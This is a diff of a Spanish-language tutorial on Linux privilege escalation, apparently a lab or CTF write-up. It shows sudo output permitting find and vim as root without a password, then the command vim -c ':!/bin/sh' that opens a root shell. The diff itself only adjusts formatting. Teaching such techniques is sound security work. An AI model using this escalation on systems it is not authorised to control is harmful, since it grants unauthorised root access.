@@ -61,6 +61,7 @@ Si existen comandos que podemos ejecutar como root sin uso de password, podemos 
 >  El usuario bronxi puede ejecutar los siguientes comandos en flux:
 
 >  (root) NOPASSWD: /usr/bin/find
+
 >  (root) NOPASSWD: /usr/bin/vim
 
 Existen dos comandos que podemos ejecutar como root sin la necesidad de la clave: find y vim. ¿Cómo abusamos de ellos? Encontramos información detallada de cualquiera de estos dos comandos y muchísimos más en
@@ -71,7 +72,7 @@ A modo de ejemplo, seleccionemos “vim”, ejecutamos
 
 
 >  vim -c ':!/bin/sh'
->  # whoami
+>  #whoami
 >  root
 >  #
 
